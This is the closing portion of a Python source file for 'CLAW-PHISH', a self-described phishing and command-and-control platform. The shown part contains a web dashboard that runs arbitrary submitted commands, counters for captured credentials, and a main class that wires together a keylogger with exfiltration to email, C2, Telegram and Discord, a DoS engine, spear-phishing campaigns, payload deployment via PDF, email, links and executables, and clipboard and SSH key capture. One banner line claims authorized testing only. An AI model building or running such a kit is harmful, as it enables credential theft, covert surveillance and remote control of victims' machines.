                    background: var(--red);
                    padding: 10px;
                    text-align: center;
                    color: var(--slate);
                    font-size: 12px;
                    border-top: 1px solid var(--line);
                    letter-spacing: 2px;
                }
                .terminal-cursor {
                    display: inline-block;
                    width: 10px;
                    height: 20px;
                    background: var(--red-light);
                    animation: blink 1s infinite;
                }
                @keyframes blink {
                    0%, 50% { opacity: 1; }
                    51%, 100% { opacity: 0; }
                }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <script>
                var socket = io();
                
                socket.on('command_result', function(data) {
                    var outputDiv = document.getElementById('command-output');
                    outputDiv.innerHTML = '<span style="color:var(--red-light)">$></span> ' + data.command + '<br>' +
                                          '<span style="color:var(--red-light)">output></span><br>' + data.output + '<br>' +
                                          '<span style="color:var(--red-light)">time></span> ' + data.execution_time + 's';
                });
                
                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:var(--red-light)">$></span> ' + command + '<br>' +
                                    '<span style="color:var(--red-light)">output></span><br>' + data.output + '<br>' +
                                    '<span style="color:var(--red-light)">time></span> ' + data.execution_time + 's';
                            } else {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:#ff6b6b">error></span> ' + data.error;
                            }
                        });
                    }
                }
                
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        executeCommand();
                    }
                });
            </script>
        </head>
        <body>
            <div class="header glow">
                <h1>🦀 CLAW<span>-PHISH</span></h1>
                <p>▸ ULTIMATE PHISHING & COMMAND & CONTROL PLATFORM</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>COMMANDS EXECUTED</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>THREATS DETECTED</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>BLOCKED IPS</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>CREDENTIALS CAPTURED</p></div>
                    <div class="stat-card"><h3 id="statDomains">0</h3><p>HOSTED DOMAINS</p></div>
                    <div class="stat-card"><h3 id="statPhishing">0</h3><p>PHISHING LINKS</p></div>
                </div>
                
                <div class="section">
                    <h2>🚀 COMMAND CENTER</h2>
                    <div style="display:flex; gap:10px;">
                        <span style="color:var(--red-light); font-size:20px;">$></span>
                        <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1;">
                        <button onclick="executeCommand()">EXECUTE</button>
                    </div>
                    <div id="command-output" class="output" style="margin-top:10px;">
                        <span style="color:var(--red-light)">system></span> Ready for commands...
                        <span class="terminal-cursor"></span>
                    </div>
                </div>
                
                <div class="section">
                    <h2>📊 RECENT THREATS</h2>
                    <div id="threats">
                        <table>
                            <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                            <tbody id="threats-table"></tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="warning-banner">
                ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY — ALL ACTIVITY IS LOGGED
            </div>
            <script>
                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statDomains').textContent = data.total_domain_hosts || 0;
                            document.getElementById('statPhishing').textContent = data.total_phishing_links || 0;
                        });
                }
                
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                
                loadStats();
                loadThreats();
                setInterval(loadStats, 5000);
                setInterval(loadThreats, 5000);
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class ClawPhish:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        self.spear = SpearPhishingEngine(self.db, self.config)
        self.agent = AgentEngine(self.db, self.config)
        self.network_monitor = NetworkMonitor(self.db, self.config)
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config)
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        
        # Platform bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.imessage = iMessageBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        self.whatsapp = WhatsAppBot(None, self.db)
        
        # Set up handlers
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.dos, self.spear, self.agent, self.network_monitor,
            self.keylogger, self.deployment, self.domain_hosting,
            self.signal, self.imessage, self.google_chat, self.whatsapp
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.imessage.handler = self.handler
        self.google_chat.handler = self.handler
        self.whatsapp.handler = self.handler
        
        # Connect keylogger to bots
        if self.keylogger:
            self.keylogger.telegram_bot = self.telegram
            self.keylogger.discord_bot = self.discord
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🦀 CLAW-PHISH v5.0.0 - Ultimate Phishing & C2 Platform          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🦀 21000+ Security Commands              • 📡 Ping / Nmap / Curl / Netcat{Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution        • 🚀 REAL Traffic Generation    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🕷️ Nikto Web Vulnerability Scanner      • 🎣 Social Engineering Suite   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)             • 💥 DOS Attack Capabilities    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📧 Spear Phishing Campaigns            • 🤖 Agent Command & Control    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration      • 💻 Web Dashboard              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack             • Signal | iMessage | WhatsApp  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection     • 🌐 IP to Domain Translation   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🏠 Domain Hosting Engine               • 📊 Graphical Reports         {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📡 Network Monitoring                   • 🔐 Agent Mode                 {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📦 PDF/Email/Link Deployment           • 🔑 Clipboard/SSH Key Capture  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🎯 100+ Phishing Templates              • 🐍 Python Execution          {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 21000+ ADVANCED CYBERSECURITY COMMANDS                       {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🦀 Welcome to CLAW-PHISH - Your Ultimate Phishing & C2 Platform{Colors.RESET}
{Colors.SECONDARY}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.SECONDARY}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.SECONDARY}🌐 Web dashboard available at http://localhost:5000 (if enabled){Colors.RESET}
{Colors.SECONDARY}📦 Use 'deploy_*' commands to create payloads{Colors.RESET}
{Colors.SECONDARY}🌐 Use 'ip_to_domain' and 'domain_to_ip' for domain translation{Colors.RESET}
{Colors.SECONDARY}🏠 Use 'host_domain' to host domains on specific IPs{Colors.RESET}
{Colors.SECONDARY}🎣 Use 'phish_*' commands to create phishing links{Colors.RESET}
{Colors.SECONDARY}🐍 Use 'python' to execute Python code directly{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SIGNAL_AVAILABLE else Colors.WARNING}✅ signal-cli{Colors.RESET}" if SIGNAL_AVAILABLE else f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if IMESSAGE_AVAILABLE else Colors.WARNING}✅ iMessage{Colors.RESET}" if IMESSAGE_AVAILABLE else f"{Colors.WARNING}⚠️ iMessage only available on macOS{Colors.RESET}")
        print(f"{Colors.SUCCESS if WHATSAPP_AVAILABLE else Colors.WARNING}✅ pywhatkit{Colors.RESET}" if WHATSAPP_AVAILABLE else f"{Colors.WARNING}⚠️ pywhatkit not found - WhatsApp disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DNS_AVAILABLE else Colors.WARNING}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.WARNING}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                self.discord.config['channel_id'] = channel
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ACCENT}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.ACCENT}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.ACCENT}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.ACCENT}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                self.config.set('keylogger.enabled', True)
                self.config.set('keylogger.exfil_methods', ['file', 'email', 'c2', 'telegram', 'discord'])
                self.config.save()
                print(f"{Colors.SUCCESS}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
                print(f"{Colors.SECONDARY}  • Exfiltration methods: file, email, c2, telegram, discord{Colors.RESET}")
                print(f"{Colors.SECONDARY}  • Screenshot interval: {self.config.get('keylogger.screenshot_interval', 60)}s{Colors.RESET}")
                print(f"{Colors.SECONDARY}  • Upload interval: {self.config.get('keylogger.upload_interval', 30)}s{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
        
        # Domain Hosting
        setup = input(f"{Colors.ACCENT}Enable Domain Hosting Engine? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            self.config.set('domain_hosting.enabled', True)
            self.config.save()
            print(f"{Colors.SUCCESS}✅ Domain hosting enabled. Use 'host_domain' to host domains.{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        auto_monitor = input(f"\n{Colors.ACCENT}Start threat monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.network_monitor.start()
            print(f"{Colors.SUCCESS}✅ Network monitoring started{Colors.RESET}")
        
        setup_platforms = input(f"{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ CLAW-PHISH ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   Type 'help' for commands, 'deploy_*' for payload deployment{Colors.RESET}")
        print(f"{Colors.SECONDARY}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.SECONDARY}   📦 Use 'deploy_pdf', 'deploy_email', 'deploy_link', 'deploy_executable'{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🌐 Use 'ip_to_domain' and 'domain_to_ip' for domain translation{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🏠 Use 'host_domain' to host domains on specific IPs{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🎣 Use 'phish_*' commands to create phishing links{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🐍 Use 'python' to execute Python code directly{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🦀> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result.get('exit'):
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.network_monitor.stop()
        self.agent.stop_heartbeat()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PRIMARY}🦀 Starting CLAW-PHISH...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        app = ClawPhish()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()